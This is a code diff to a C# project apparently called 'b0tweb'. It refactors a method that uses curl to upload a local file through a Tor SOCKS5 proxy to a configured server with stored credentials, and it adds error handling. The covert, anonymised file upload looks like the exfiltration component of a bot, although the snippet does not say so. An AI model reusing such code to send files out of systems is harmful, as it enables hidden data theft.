@@ -19,8 +19,9 @@ namespace b0tweb
         {
             string basePath = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
             string argument = String.Format(
-                 "--socks5-hostname {0}  -F \"files[]=@{1}\" {2}  --user {3}:{4}",
-                "localhost:9050", //TODO: Move this to tor proxy
+                 "--socks5-hostname {0}:{1}  -F \"files[]=@{2}\" {3}  --user {4}:{5}",
+                TorProxy.Host,
+                TorProxy.Port,
                 filePath,
                 Configuration.HTTPServer,
                 Configuration.HTTPUsername,
@@ -42,14 +43,22 @@ namespace b0tweb
 
             process.Start();
 
-            dynamic json = JsonConvert.DeserializeObject(process.StandardOutput.ReadToEnd());
-
-            if (json.success == true)
+            try
             {
-                return json.files[0].url;
-            }
+                dynamic json = JsonConvert.DeserializeObject(process.StandardOutput.ReadToEnd());
 
-            return String.Empty;
+                if (json.success == true)
+                {
+                    return json.files[0].url;
+                }
+
+                // Will be set if not successful
+                return json.description;
+            }
+            catch (Exception e)
+            {
+                return e.Message;
+            }
         }
     }
 }
